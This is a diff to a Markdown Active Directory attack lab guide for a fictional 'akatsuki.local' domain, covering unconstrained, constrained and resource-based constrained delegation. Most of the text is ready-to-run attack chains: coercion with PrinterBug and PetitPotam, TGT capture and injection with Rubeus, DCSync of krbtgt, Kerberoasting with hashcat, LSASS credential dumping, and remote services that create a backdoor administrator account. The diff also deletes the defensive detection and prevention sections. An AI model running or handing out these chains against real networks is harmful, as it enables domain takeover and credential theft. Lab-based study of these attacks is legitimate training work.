@@ -1907,14 +1907,6 @@ Enter-PSSession -ComputerName WS01 -Credential (Get-Credential)
 
 When a server has Unconstrained Delegation, it caches the TGT of any user who connects. The server can impersonate that user to ANY service.
 
-### Root Cause: Why This Works
-
-| Factor | Description |
-|--------|-------------|
-| TGT forwarding | User's TGT sent to server |
-| Caching | Server stores TGTs in memory |
-| No restrictions | Can use TGT for any service |
-
 ### Lab Setup: Make It Vulnerable
 
 ```powershell
@@ -1929,11 +1921,15 @@ Get-ADComputer WS01 -Properties TrustedForDelegation
 Write-Host "WS01 now has Unconstrained Delegation - TGTs will be cached" -ForegroundColor Yellow
 ```
 
-### Attack Methods
+### Complete Attack Flow
 
-#### 🌐 REMOTE (From Kali)
+#### 🌐 REMOTE (From Kali) - Full Chain
 
-**Step 1: Find unconstrained delegation machines**
+**Prerequisites:**
+- Domain credentials (any user)
+- Admin access on the unconstrained delegation machine (WS01)
+
+**Step 1: Enumerate - Find unconstrained delegation machines**
 ```bash
 # Using ldapsearch
 ldapsearch -x -H ldap://10.10.12.10 -D "orochimaru@akatsuki.local" -w 'Snake2024!' -b "DC=akatsuki,DC=local" "(&(objectCategory=computer)(userAccountControl:1.2.840.113556.1.4.803:=524288))" cn
@@ -1943,77 +1939,155 @@ crackmapexec ldap 10.10.12.10 -u orochimaru -p 'Snake2024!' -M find-delegation
 
 # Using bloodhound-python
 bloodhound-python -u orochimaru -p 'Snake2024!' -d akatsuki.local -ns 10.10.12.10 -c All
-# Then query in BloodHound for unconstrained delegation
+# BloodHound query: MATCH (c:Computer {unconstraineddelegation:true}) RETURN c
 ```
 
-**Step 2: Coerce DC to authenticate to compromised machine**
+**Step 2: Get admin shell on unconstrained delegation machine (WS01)**
 ```bash
-# PrinterBug - forces DC to authenticate to WS01
-python3 printerbug.py AKATSUKI/orochimaru:'Snake2024!'@10.10.12.10 10.10.12.21
+# If you already have pain's creds (local admin on WS01)
+evil-winrm -i 10.10.12.11 -u pain -p 'Password123!'
 
-# PetitPotam - EFS coercion (may work without creds!)
-python3 PetitPotam.py 10.10.12.21 10.10.12.10
+# Or via psexec
+psexec.py AKATSUKI/pain:'Password123!'@10.10.12.11
 
-# Coercer - tries multiple coercion methods
-python3 coercer.py -u orochimaru -p 'Snake2024!' -d akatsuki.local -l 10.10.12.21 -t 10.10.12.10
+# Or via wmiexec
+wmiexec.py AKATSUKI/pain:'Password123!'@10.10.12.11
 ```
 
-**Step 3: Use captured TGT from Linux**
-```bash
-# Convert captured .kirbi to .ccache
-ticketConverter.py dc01_tgt.kirbi dc01.ccache
+**Step 3: Start Rubeus monitor on WS01 to capture incoming TGTs**
+```powershell
+# Upload Rubeus first
+# Then run monitor mode - this will capture any TGT that comes in
+.\Rubeus.exe monitor /interval:5 /nowrap /filteruser:DC01$
 
-# Export and use
-export KRB5CCNAME=dc01.ccache
+# Output will show captured tickets like:
+# [*] Captured TGT - user: DC01$@AKATSUKI.LOCAL
+# [*] base64(ticket.kirbi): doIFxjCCBcKgAwIB...
+```
+
+**Step 4: From Kali - Trigger coercion to force DC to authenticate to WS01**
+```bash
+# PrinterBug (Spooler service - common)
+python3 printerbug.py AKATSUKI/orochimaru:'Snake2024!'@10.10.12.10 10.10.12.11
+
+# If PrinterBug fails, try PetitPotam (EFS)
+python3 PetitPotam.py 10.10.12.11 10.10.12.10
+
+# If both fail, try Coercer (tests multiple methods)
+python3 coercer.py -u orochimaru -p 'Snake2024!' -d akatsuki.local -l 10.10.12.11 -t 10.10.12.10
+
+# DFSCoerce
+python3 dfscoerce.py -u orochimaru -p 'Snake2024!' -d akatsuki.local 10.10.12.11 10.10.12.10
+```
+
+**Step 5: Copy the base64 ticket from Rubeus output**
+```
+# Rubeus will output something like:
+[*] 1/28/2024 12:34:56 PM UTC - Found new TGT:
+  User                  :  DC01$@AKATSUKI.LOCAL
+  StartTime             :  1/28/2024 12:34:56 PM
+  EndTime               :  1/28/2024 10:34:56 PM
+  RenewTill             :  2/4/2024 12:34:56 PM
+  Flags                 :  name_canonicalize, pre_authent, renewable, forwarded, forwardable
+  Base64EncodedTicket   :  doIFxjCCBcKgAwIBBaEDAgEWoo... [COPY THIS ENTIRE STRING]
+```
+
+**Step 6: Use the captured TGT from Linux**
+```bash
+# Save base64 to file and convert
+echo "doIFxjCCBcKgAwIBBaEDAgEWoo..." | base64 -d > dc01.kirbi
+
+# Convert .kirbi to .ccache
+ticketConverter.py dc01.kirbi dc01.ccache
+
+# Export the ticket
+export KRB5CCNAME=$(pwd)/dc01.ccache
+
+# Verify ticket works
+klist
+
+# DCSync - dump all hashes
 secretsdump.py -k -no-pass akatsuki.local/DC01\$@dc01.akatsuki.local
+
+# Or get shell on DC
+psexec.py -k -no-pass dc01.akatsuki.local
+
+# Or access shares
+smbclient.py -k -no-pass dc01.akatsuki.local
 ```
 
-#### 💻 LOCAL (With Admin Shell on Unconstrained Delegation Machine)
+#### 💻 LOCAL (Full Windows Attack Chain)
 
 **Step 1: Find unconstrained delegation machines**
 ```powershell
 # PowerView
-Get-DomainComputer -Unconstrained
+Import-Module .\PowerView.ps1
+Get-DomainComputer -Unconstrained | Select-Object dnshostname
 
 # AD Module
-Get-ADComputer -Filter {TrustedForDelegation -eq $true}
+Get-ADComputer -Filter {TrustedForDelegation -eq $true} -Properties TrustedForDelegation | Select Name
+
+# Manual LDAP
+([adsisearcher]'(&(objectCategory=computer)(userAccountControl:1.2.840.113556.1.4.803:=524288))').FindAll()
 ```
 
-**Step 2: Monitor for incoming TGTs**
+**Step 2: Start Rubeus monitor (run as admin on WS01)**
 ```powershell
-# Rubeus - monitor and capture TGTs
-Rubeus.exe monitor /interval:5 /nowrap
+# Monitor for all incoming TGTs
+.\Rubeus.exe monitor /interval:5 /nowrap
 
-# Or export all current tickets
-mimikatz # sekurlsa::tickets /export
+# Or filter for specific targets
+.\Rubeus.exe monitor /interval:5 /nowrap /filteruser:DC01$
+.\Rubeus.exe monitor /interval:5 /nowrap /filteruser:itachi
 ```
 
-**Step 3: Force high-value target to connect (from another shell)**
-```bash
-# From Kali - PrinterBug
-python3 printerbug.py AKATSUKI/orochimaru:'Snake2024!'@10.10.12.10 10.10.12.21
-```
-
-**Step 4: Use captured TGT**
+**Step 3: Trigger coercion (from same or different machine)**
 ```powershell
-# Import captured TGT
-mimikatz # kerberos::ptt [0;xxxxx]-2-1-xxxxxxxx-DC01$@krbtgt-AKATSUKI.LOCAL.kirbi
+# SpoolSample.exe (PrinterBug)
+.\SpoolSample.exe dc01.akatsuki.local ws01.akatsuki.local
 
-# Or with Rubeus
-Rubeus.exe ptt /ticket:BASE64_TGT
+# Or from Kali
+python3 printerbug.py AKATSUKI/orochimaru:'Snake2024!'@10.10.12.10 10.10.12.11
+```
 
-# Verify and use
+**Step 4: Rubeus captures the TGT - inject it**
+```powershell
+# Copy the base64 ticket from Rubeus output and inject
+.\Rubeus.exe ptt /ticket:doIFxjCCBcKgAwIBBaEDAgEWoo...
+
+# Verify ticket is loaded
 klist
+
+# You now have DC01$ machine account access!
+```
+
+**Step 5: Use the ticket - DCSync**
+```powershell
+# With mimikatz - DCSync all users
+mimikatz # lsadump::dcsync /domain:akatsuki.local /all
+
+# DCSync specific user (krbtgt for Golden Ticket)
+mimikatz # lsadump::dcsync /domain:akatsuki.local /user:krbtgt
+
+# DCSync Domain Admin
+mimikatz # lsadump::dcsync /domain:akatsuki.local /user:itachi
+
+# Access DC shares
 dir \\dc01.akatsuki.local\c$
 ```
 
-### Blue Team: Detection & Prevention
+**Step 6: Alternative - Export tickets with mimikatz**
+```powershell
+# Instead of Rubeus, use mimikatz to export cached tickets
+mimikatz # privilege::debug
+mimikatz # sekurlsa::tickets /export
 
-| Detection | Prevention |
-|-----------|------------|
-| TGT caching on non-DCs | Remove unconstrained delegation |
-| Coercion patterns | Use constrained delegation instead |
-| Unusual connections | Add sensitive accounts to "Protected Users" |
+# This creates .kirbi files - find the DC01$ TGT
+dir *.kirbi
+
+# Import and use
+mimikatz # kerberos::ptt [0;3e7]-0-0-40a50000-DC01$@krbtgt-AKATSUKI.LOCAL.kirbi
+```
 
 ### Cleanup: Remove Vulnerability
 
@@ -2027,13 +2101,14 @@ Set-ADComputer -Identity "WS01" -TrustedForDelegation $false
 
 ### Concept
 
-Constrained delegation limits impersonation to specific services listed in `msDS-AllowedToDelegateTo`. However, with the service account hash, you can abuse S4U extensions.
+Constrained delegation limits impersonation to specific services listed in `msDS-AllowedToDelegateTo`. With the service account credentials, you abuse S4U2Self + S4U2Proxy to impersonate any user to those services.
 
 ### Lab Setup: Make It Vulnerable
 
 ```powershell
-# Create service account with constrained delegation
+# Run on DC as Domain Admin
 
+# Create service account with constrained delegation
 $password = ConvertTo-SecureString "WebServicePass!" -AsPlainText -Force
 New-ADUser -Name "svc_web" `
     -SamAccountName "svc_web" `
@@ -2046,66 +2121,205 @@ New-ADUser -Name "svc_web" `
 # Set constrained delegation to CIFS on DC
 Set-ADUser -Identity "svc_web" -Add @{'msDS-AllowedToDelegateTo'=@('cifs/dc01.akatsuki.local')}
 
-# Enable trust for delegation
+# Enable Protocol Transition (TrustedToAuthForDelegation)
 Set-ADAccountControl -Identity "svc_web" -TrustedToAuthForDelegation $true
 
-Write-Host "svc_web can now delegate to CIFS on DC01" -ForegroundColor Yellow
+# Verify setup
+Get-ADUser svc_web -Properties msDS-AllowedToDelegateTo, TrustedToAuthForDelegation
+
+Write-Host "svc_web can delegate to CIFS on DC01 with Protocol Transition" -ForegroundColor Yellow
 ```
 
-### Attack Methods
+### Complete Attack Flow
 
-#### 🌐 REMOTE (From Kali - using S4U)
+#### 🌐 REMOTE (From Kali) - Full Chain
 
-**Step 1: Find constrained delegation**
+**Prerequisites:**
+- Domain credentials to enumerate
+- Need to obtain svc_web credentials (password or hash)
+
+**Step 1: Enumerate - Find constrained delegation accounts**
 ```bash
 # Using ldapsearch
-ldapsearch -x -H ldap://10.10.12.10 -D "orochimaru@akatsuki.local" -w 'Snake2024!' -b "DC=akatsuki,DC=local" "(msDS-AllowedToDelegateTo=*)" cn msDS-AllowedToDelegateTo
+ldapsearch -x -H ldap://10.10.12.10 -D "orochimaru@akatsuki.local" -w 'Snake2024!' \
+  -b "DC=akatsuki,DC=local" "(msDS-AllowedToDelegateTo=*)" \
+  cn msDS-AllowedToDelegateTo userAccountControl
 
 # Using CrackMapExec
 crackmapexec ldap 10.10.12.10 -u orochimaru -p 'Snake2024!' -M find-delegation
+
+# Using findDelegation.py (Impacket)
+findDelegation.py AKATSUKI/orochimaru:'Snake2024!' -dc-ip 10.10.12.10
+
+# BloodHound
+bloodhound-python -u orochimaru -p 'Snake2024!' -d akatsuki.local -ns 10.10.12.10 -c All
+# Query: MATCH (u) WHERE u.allowedtodelegate IS NOT NULL RETURN u
 ```
 
-**Step 2: Abuse with Impacket getST.py (S4U2Self + S4U2Proxy)**
+**Step 2: Obtain svc_web credentials**
+
+Option A - Kerberoast (if SPN is set):
 ```bash
-# Get service ticket as administrator for CIFS on DC
-getST.py -spn cifs/dc01.akatsuki.local -impersonate administrator AKATSUKI/svc_web:'WebServicePass!' -dc-ip 10.10.12.10
+# Check if svc_web has an SPN
+GetUserSPNs.py AKATSUKI/orochimaru:'Snake2024!' -dc-ip 10.10.12.10
 
-# With hash instead of password
-getST.py -spn cifs/dc01.akatsuki.local -impersonate administrator -hashes :NTHASH AKATSUKI/svc_web -dc-ip 10.10.12.10
+# If yes, request and crack the hash
+GetUserSPNs.py AKATSUKI/orochimaru:'Snake2024!' -dc-ip 10.10.12.10 -request -outputfile svc_web.hash
 
-# Export and use
-export KRB5CCNAME=administrator.ccache
+# Crack with hashcat
+hashcat -m 13100 svc_web.hash /usr/share/wordlists/rockyou.txt
+```
+
+Option B - Dump from machine running the service:
+```bash
+# If you have admin on machine where svc_web service runs
+secretsdump.py AKATSUKI/pain:'Password123!'@10.10.12.11
+
+# Or via LSASS dump
+```
+
+Option C - Password in description/notes field:
+```bash
+# Check user attributes for passwords
+ldapsearch -x -H ldap://10.10.12.10 -D "orochimaru@akatsuki.local" -w 'Snake2024!' \
+  -b "DC=akatsuki,DC=local" "(sAMAccountName=svc_web)" description info
+```
+
+**Step 3: Perform S4U attack with svc_web credentials**
+```bash
+# S4U2Self + S4U2Proxy to get ticket as Administrator for CIFS on DC
+getST.py -spn cifs/dc01.akatsuki.local -impersonate administrator \
+  AKATSUKI/svc_web:'WebServicePass!' -dc-ip 10.10.12.10
+
+# If you have the hash instead
+getST.py -spn cifs/dc01.akatsuki.local -impersonate administrator \
+  -hashes :58a478135a93ac3bf058a5ea0e8fdb71 AKATSUKI/svc_web -dc-ip 10.10.12.10
+
+# This creates administrator.ccache
+```
+
+**Step 4: Use the impersonated ticket**
+```bash
+# Export the ticket
+export KRB5CCNAME=$(pwd)/administrator.ccache
+
+# Verify
+klist
+
+# Access DC CIFS share
 smbclient.py -k -no-pass dc01.akatsuki.local
+
+# List shares
+smbclient.py -k -no-pass dc01.akatsuki.local -c 'shares'
+
+# Get shell via SMB
+psexec.py -k -no-pass dc01.akatsuki.local
+
+# Or wmiexec
+wmiexec.py -k -no-pass dc01.akatsuki.local
+
+# DCSync (if you got LDAP access via alternative service)
 secretsdump.py -k -no-pass akatsuki.local/administrator@dc01.akatsuki.local
 ```
 
-#### 💻 LOCAL (With Shell on Domain-Joined Machine)
+**Step 5: Alternative Service Abuse (SPN doesn't matter!)**
+```bash
+# The service in the ticket (cifs) can be changed!
+# Even though delegation is to CIFS, you can request other services
 
-**Step 1: Find constrained delegation**
-```powershell
-# PowerView
-Get-DomainUser -TrustedToAuth | Select samaccountname, msds-allowedtodelegateto
-Get-DomainComputer -TrustedToAuth | Select cn, msds-allowedtodelegateto
+# Get LDAP ticket instead (for DCSync)
+getST.py -spn cifs/dc01.akatsuki.local -impersonate administrator \
+  -altservice ldap/dc01.akatsuki.local \
+  AKATSUKI/svc_web:'WebServicePass!' -dc-ip 10.10.12.10
 
-# AD Module
-Get-ADUser -Filter {TrustedToAuthForDelegation -eq $true} -Properties msDS-AllowedToDelegateTo
-Get-ADComputer -Filter {TrustedToAuthForDelegation -eq $true} -Properties msDS-AllowedToDelegateTo
+# Get HTTP ticket (for WinRM/PSRemoting)
+getST.py -spn cifs/dc01.akatsuki.local -impersonate administrator \
+  -altservice http/dc01.akatsuki.local \
+  AKATSUKI/svc_web:'WebServicePass!' -dc-ip 10.10.12.10
+
+# Get HOST ticket
+getST.py -spn cifs/dc01.akatsuki.local -impersonate administrator \
+  -altservice host/dc01.akatsuki.local \
+  AKATSUKI/svc_web:'WebServicePass!' -dc-ip 10.10.12.10
 ```
 
-**Step 2: Abuse with Rubeus (need svc_web hash)**
+#### 💻 LOCAL (From Windows) - Full Chain
+
+**Step 1: Find constrained delegation accounts**
 ```powershell
-# S4U to get admin ticket for CIFS on DC
-Rubeus.exe s4u /user:svc_web /rc4:HASH /impersonateuser:administrator /msdsspn:cifs/dc01.akatsuki.local /ptt
+# PowerView
+Import-Module .\PowerView.ps1
+Get-DomainUser -TrustedToAuth | Select-Object samaccountname, msds-allowedtodelegateto
+Get-DomainComputer -TrustedToAuth | Select-Object cn, msds-allowedtodelegateto
 
-# With AES key
-Rubeus.exe s4u /user:svc_web /aes256:AESKEY /impersonateuser:administrator /msdsspn:cifs/dc01.akatsuki.local /ptt
+# AD Module
+Get-ADUser -Filter {TrustedToAuthForDelegation -eq $true} -Properties msDS-AllowedToDelegateTo |
+  Select-Object SamAccountName, msDS-AllowedToDelegateTo
+Get-ADComputer -Filter {TrustedToAuthForDelegation -eq $true} -Properties msDS-AllowedToDelegateTo |
+  Select-Object Name, msDS-AllowedToDelegateTo
+```
 
-# Alternative SPN (can change service!)
-Rubeus.exe s4u /user:svc_web /rc4:HASH /impersonateuser:administrator /msdsspn:cifs/dc01.akatsuki.local /altservice:ldap /ptt
+**Step 2: Get svc_web hash (need to obtain this first)**
+```powershell
+# If running as svc_web or have access to machine running the service
+# Extract from LSASS
+mimikatz # privilege::debug
+mimikatz # sekurlsa::logonpasswords
 
-# Verify and use
+# Or calculate hash from known password
+.\Rubeus.exe hash /password:WebServicePass! /user:svc_web /domain:akatsuki.local
+# Output: rc4_hmac: 58A478135A93AC3BF058A5EA0E8FDB71
+```
+
+**Step 3: Perform S4U attack with Rubeus**
+```powershell
+# Full S4U chain - request ticket as Administrator for CIFS on DC
+.\Rubeus.exe s4u /user:svc_web /rc4:58A478135A93AC3BF058A5EA0E8FDB71 \
+  /impersonateuser:administrator /msdsspn:cifs/dc01.akatsuki.local /ptt
+
+# With AES key (if you have it)
+.\Rubeus.exe s4u /user:svc_web /aes256:AESKEY \
+  /impersonateuser:administrator /msdsspn:cifs/dc01.akatsuki.local /ptt
+
+# Rubeus will:
+# 1. Request TGT for svc_web
+# 2. S4U2Self: Get forwardable ticket as Administrator to svc_web
+# 3. S4U2Proxy: Exchange for ticket as Administrator to cifs/dc01
+# 4. /ptt: Inject ticket into memory
+```
+
+**Step 4: Verify and use the ticket**
+```powershell
+# Verify ticket loaded
 klist
+
+# Access DC shares
 dir \\dc01.akatsuki.local\c$
+dir \\dc01.akatsuki.local\admin$
+
+# Copy files
+copy \\dc01.akatsuki.local\c$\Windows\System32\config\SAM C:\temp\
+
+# Create a service for shell
+sc \\dc01.akatsuki.local create pwned binpath= "cmd.exe /c net user hacker Password123! /add && net localgroup administrators hacker /add"
+sc \\dc01.akatsuki.local start pwned
+```
+
+**Step 5: Alternative Service Abuse (Windows)**
+```powershell
+# Change service type in the ticket - get LDAP for DCSync
+.\Rubeus.exe s4u /user:svc_web /rc4:58A478135A93AC3BF058A5EA0E8FDB71 \
+  /impersonateuser:administrator /msdsspn:cifs/dc01.akatsuki.local /altservice:ldap /ptt
+
+# Then DCSync
+mimikatz # lsadump::dcsync /domain:akatsuki.local /user:krbtgt
+
+# Get HTTP for WinRM
+.\Rubeus.exe s4u /user:svc_web /rc4:58A478135A93AC3BF058A5EA0E8FDB71 \
+  /impersonateuser:administrator /msdsspn:cifs/dc01.akatsuki.local /altservice:http /ptt
+
+# Then PSRemoting
+Enter-PSSession -ComputerName dc01.akatsuki.local
 ```
 
 ### Cleanup: Remove Vulnerability
@@ -2120,20 +2334,14 @@ Remove-ADUser -Identity "svc_web" -Confirm:$false
 
 ### Concept
 
-RBCD flips the trust model - the target resource specifies who can delegate TO it via `msDS-AllowedToActOnBehalfOfOtherIdentity`.
-
-### Root Cause: Why This Works
-
-| Factor | Description |
-|--------|-------------|
-| Write access | Can modify target's RBCD attribute |
-| MachineAccountQuota | Domain users can create machine accounts |
-| S4U abuse | Use machine account for delegation |
+RBCD flips the trust model - the target resource specifies who can delegate TO it via `msDS-AllowedToActOnBehalfOfOtherIdentity`. If you can write to a computer object, you can make it trust your controlled machine account.
 
 ### Lab Setup: Make It Vulnerable
 
 ```powershell
-# Grant orochimaru write access to WS02's computer object
+# Run on DC as Domain Admin
+
+# Grant orochimaru GenericWrite on WS02's computer object
 $ws02 = Get-ADComputer WS02
 $acl = Get-Acl "AD:\$($ws02.DistinguishedName)"
 
@@ -2146,89 +2354,278 @@ $acl.AddAccessRule($ace)
 Set-Acl "AD:\$($ws02.DistinguishedName)" $acl
 
 Write-Host "orochimaru can now write to WS02 computer object - RBCD vulnerable" -ForegroundColor Yellow
+
+# Verify
+Get-Acl "AD:\$($ws02.DistinguishedName)" | Select-Object -ExpandProperty Access |
+  Where-Object { $_.IdentityReference -match "orochimaru" }
 ```
 
-### Attack Methods
+### Complete Attack Flow
 
-#### 🌐 REMOTE (From Kali - Full RBCD chain)
+#### 🌐 REMOTE (From Kali) - Full Chain
 
-**Step 1: Create machine account**
+**Prerequisites:**
+- Domain credentials
+- Write access to a computer object (GenericWrite/GenericAll/WriteDACL)
+- MachineAccountQuota > 0 (default is 10)
+
+**Step 1: Enumerate - Check if you have write access to any computer**
+```bash
+# Using bloodhound-python
+bloodhound-python -u orochimaru -p 'Snake2024!' -d akatsuki.local -ns 10.10.12.10 -c All
+
+# BloodHound query: Find computers where you have write access
+# MATCH p=(u:User {name:"OROCHIMARU@AKATSUKI.LOCAL"})-[r:GenericWrite|GenericAll|WriteDacl]->(c:Computer) RETURN p
+
+# Using ldapsearch to check ACLs (complex, BloodHound is easier)
+```
+
+**Step 2: Check MachineAccountQuota**
+```bash
+# Using CrackMapExec
+crackmapexec ldap 10.10.12.10 -u orochimaru -p 'Snake2024!' -M maq
+
+# Using ldapsearch
+ldapsearch -x -H ldap://10.10.12.10 -D "orochimaru@akatsuki.local" -w 'Snake2024!' \
+  -b "DC=akatsuki,DC=local" "(objectClass=domain)" ms-DS-MachineAccountQuota
+
+# Output: ms-DS-MachineAccountQuota: 10 (default - you can create 10 machine accounts)
+```
+
+**Step 3: Create a machine account you control**
 ```bash
 # Using Impacket addcomputer.py
-addcomputer.py -computer-name 'YOURPC$' -computer-pass 'Password123!' -dc-ip 10.10.12.10 AKATSUKI/orochimaru:'Snake2024!'
+addcomputer.py -computer-name 'YOURPC$' -computer-pass 'Password123!' \
+  -dc-ip 10.10.12.10 AKATSUKI/orochimaru:'Snake2024!'
 
-# Check MachineAccountQuota first
-crackmapexec ldap 10.10.12.10 -u orochimaru -p 'Snake2024!' -M MAQ
+# Verify it was created
+crackmapexec ldap 10.10.12.10 -u orochimaru -p 'Snake2024!' -M get-desc-users
+
+# Or verify with ldapsearch
+ldapsearch -x -H ldap://10.10.12.10 -D "orochimaru@akatsuki.local" -w 'Snake2024!' \
+  -b "DC=akatsuki,DC=local" "(sAMAccountName=YOURPC$)" dn
 ```
 
-**Step 2: Set RBCD attribute (if you have write access)**
+**Step 4: Configure RBCD - Set WS02 to trust YOURPC for delegation**
 ```bash
-# Using rbcd.py from Impacket
-rbcd.py -delegate-to 'WS02$' -delegate-from 'YOURPC$' -dc-ip 10.10.12.10 -action write AKATSUKI/orochimaru:'Snake2024!'
+# Using rbcd.py (Impacket)
+rbcd.py -delegate-to 'WS02$' -delegate-from 'YOURPC$' -dc-ip 10.10.12.10 \
+  -action write AKATSUKI/orochimaru:'Snake2024!'
 
-# Or using ntlmrelayx (during relay attack)
-ntlmrelayx.py -t ldap://10.10.12.10 --delegate-access --escalate-user YOURPC$
+# Verify the delegation was set
+rbcd.py -delegate-to 'WS02$' -dc-ip 10.10.12.10 \
+  -action read AKATSUKI/orochimaru:'Snake2024!'
+
+# Should show: Delegation rights for WS02$: YOURPC$
 ```
 
-**Step 3: S4U attack to get admin ticket**
+**Step 5: Perform S4U attack to get Administrator ticket for WS02**
 ```bash
-# Get ticket as administrator for CIFS on WS02
-getST.py -spn cifs/ws02.akatsuki.local -impersonate administrator AKATSUKI/'YOURPC$':'Password123!' -dc-ip 10.10.12.10
+# S4U2Self + S4U2Proxy to impersonate Administrator to CIFS on WS02
+getST.py -spn cifs/ws02.akatsuki.local -impersonate administrator \
+  AKATSUKI/'YOURPC$':'Password123!' -dc-ip 10.10.12.10
 
-# Export and use
-export KRB5CCNAME=administrator.ccache
+# This creates administrator.ccache
+# If you get errors about the SPN, try with the hostname only:
+getST.py -spn cifs/WS02 -impersonate administrator \
+  AKATSUKI/'YOURPC$':'Password123!' -dc-ip 10.10.12.10
+```
+
+**Step 6: Use the ticket to access WS02**
+```bash
+# Export the ticket
+export KRB5CCNAME=$(pwd)/administrator.ccache
+
+# Verify it's loaded
+klist
+
+# Access WS02 via SMB
 smbclient.py -k -no-pass ws02.akatsuki.local
-wmiexec.py -k -no-pass akatsuki.local/administrator@ws02.akatsuki.local
+
+# Get shell on WS02
+psexec.py -k -no-pass ws02.akatsuki.local
+wmiexec.py -k -no-pass ws02.akatsuki.local
+
+# Or run commands
+smbexec.py -k -no-pass ws02.akatsuki.local
+
+# Dump SAM/LSA from WS02
+secretsdump.py -k -no-pass ws02.akatsuki.local
 ```
 
-#### 💻 LOCAL (With Shell on Domain-Joined Machine)
+**Step 7: Post-exploitation - Pivot further**
+```bash
+# Now you're admin on WS02, dump any cached credentials
+secretsdump.py -k -no-pass ws02.akatsuki.local
 
-**Step 1: Create a machine account (if MachineAccountQuota > 0)**
+# If a Domain Admin was logged in, you get their hash!
+# Use that to move to DC
+psexec.py -hashes :DAHASH AKATSUKI/itachi@10.10.12.10
+```
+
+#### 💻 LOCAL (From Windows) - Full Chain
+
+**Step 1: Enumerate - Find computers you can write to**
 ```powershell
-# Using PowerMad
+# PowerView - Find objects where current user has GenericWrite/GenericAll
+Import-Module .\PowerView.ps1
+
+# Check your access rights
+Find-InterestingDomainAcl -ResolveGUIDs |
+  Where-Object { $_.IdentityReferenceName -match "orochimaru" -and $_.ObjectType -eq "Computer" }
+
+# Or check specific computer
+Get-DomainObjectAcl -Identity "WS02" -ResolveGUIDs |
+  Where-Object { $_.ActiveDirectoryRights -match "GenericWrite|GenericAll|WriteDacl" }
+```
+
+**Step 2: Check MachineAccountQuota**
+```powershell
+# AD Module
+Get-ADDomain | Select-Object -ExpandProperty DistinguishedName | ForEach-Object {
+    Get-ADObject -Identity $_ -Properties ms-DS-MachineAccountQuota |
+    Select-Object -ExpandProperty ms-DS-MachineAccountQuota
+}
+
+# Or LDAP query
+([ADSI]"LDAP://DC=akatsuki,DC=local")."ms-DS-MachineAccountQuota"
+```
+
+**Step 3: Create a machine account using PowerMad**
+```powershell
+# Import PowerMad
 Import-Module .\Powermad.ps1
+
+# Create new machine account
 New-MachineAccount -MachineAccount YOURPC -Password $(ConvertTo-SecureString 'Password123!' -AsPlainText -Force)
 
-# Get the new machine account SID
-$sid = Get-DomainComputer YOURPC -Properties objectsid | Select -Expand objectsid
+# Verify
+Get-ADComputer YOURPC
+
+# Get the SID (needed for raw RBCD config)
+$sid = (Get-ADComputer YOURPC).SID.Value
+Write-Host "Machine account SID: $sid"
 ```
 
-**Step 2: Set RBCD - allow YOURPC to delegate to WS02**
+**Step 4: Configure RBCD on WS02**
 ```powershell
-# Using PowerView / AD module
+# Method 1: Using Set-ADComputer (easiest)
 Set-ADComputer WS02 -PrincipalsAllowedToDelegateToAccount YOURPC$
 
-# Or using raw descriptor
+# Verify
+Get-ADComputer WS02 -Properties PrincipalsAllowedToDelegateToAccount |
+  Select-Object -ExpandProperty PrincipalsAllowedToDelegateToAccount
+
+# Method 2: Using PowerView (if Set-ADComputer fails)
+$sid = (Get-ADComputer YOURPC).SID.Value
 $SD = New-Object Security.AccessControl.RawSecurityDescriptor -ArgumentList "O:BAD:(A;;CCDCLCSWRPWPDTLOCRSDRCWDWO;;;$sid)"
 $SDBytes = New-Object byte[] ($SD.BinaryLength)
 $SD.GetBinaryForm($SDBytes, 0)
 Set-DomainObject WS02 -Set @{'msds-allowedtoactonbehalfofotheridentity'=$SDBytes}
 ```
 
-**Step 3: Get machine account hash**
+**Step 5: Get the NTLM hash of your machine account**
 ```powershell
-# Calculate NTLM hash from password
-Rubeus.exe hash /password:Password123!
+# Rubeus can calculate hash from password
+.\Rubeus.exe hash /password:Password123! /user:YOURPC$ /domain:akatsuki.local
+
+# Output example:
+# [*] rc4_hmac: 58A478135A93AC3BF058A5EA0E8FDB71
+# [*] aes128_cts_hmac_sha1: ...
+# [*] aes256_cts_hmac_sha1: ...
+
+# Save the rc4_hmac (NTLM hash)
 ```
 
-**Step 4: Use S4U to get admin ticket**
+**Step 6: Perform S4U attack with Rubeus**
 ```powershell
-Rubeus.exe s4u /user:YOURPC$ /rc4:HASH /impersonateuser:administrator /msdsspn:cifs/ws02.akatsuki.local /ptt
+# Full S4U chain - impersonate Administrator to CIFS on WS02
+.\Rubeus.exe s4u /user:YOURPC$ /rc4:58A478135A93AC3BF058A5EA0E8FDB71 \
+  /impersonateuser:administrator /msdsspn:cifs/ws02.akatsuki.local /ptt
 
-# Verify and access
+# Or with AES key for opsec
+.\Rubeus.exe s4u /user:YOURPC$ /aes256:AESKEY \
+  /impersonateuser:administrator /msdsspn:cifs/ws02.akatsuki.local /ptt
+
+# Rubeus output will show:
+# [*] Action: S4U
+# [*] Building S4U2self request for: 'YOURPC$@AKATSUKI.LOCAL'
+# [*] Sending S4U2self request
+# [+] S4U2self success!
+# [*] Building S4U2proxy request for: 'administrator@AKATSUKI.LOCAL'
+# [+] S4U2proxy success!
+# [+] Ticket successfully imported!
+```
+
+**Step 7: Verify and use the ticket**
+```powershell
+# Verify ticket is loaded
 klist
-ls \\ws02\c$
+
+# Access WS02 file system
+dir \\ws02.akatsuki.local\c$
+dir \\ws02.akatsuki.local\admin$
+
+# Copy files
+copy \\ws02.akatsuki.local\c$\Users\Administrator\Desktop\* C:\loot\
+
+# Create a remote service for shell
+sc \\ws02.akatsuki.local create pwned binpath= "cmd.exe /c net user hacker Password123! /add"
+sc \\ws02.akatsuki.local start pwned
+
+# Or use PSExec
+.\PsExec.exe \\ws02.akatsuki.local cmd.exe
 ```
 
-### Blue Team: Prevention
+**Step 8: Alternative - Get other service tickets**
+```powershell
+# Get LDAP service ticket (useful for LDAP operations)
+.\Rubeus.exe s4u /user:YOURPC$ /rc4:58A478135A93AC3BF058A5EA0E8FDB71 \
+  /impersonateuser:administrator /msdsspn:ldap/ws02.akatsuki.local /ptt
 
-- Set MachineAccountQuota to 0
-- Monitor msDS-AllowedToActOnBehalfOfOtherIdentity changes
-- Limit GenericWrite permissions
+# Get HOST service ticket (useful for WMI, services)
+.\Rubeus.exe s4u /user:YOURPC$ /rc4:58A478135A93AC3BF058A5EA0E8FDB71 \
+  /impersonateuser:administrator /msdsspn:host/ws02.akatsuki.local /ptt
+
+# Get HTTP service ticket (useful for WinRM)
+.\Rubeus.exe s4u /user:YOURPC$ /rc4:58A478135A93AC3BF058A5EA0E8FDB71 \
+  /impersonateuser:administrator /msdsspn:http/ws02.akatsuki.local /ptt
+
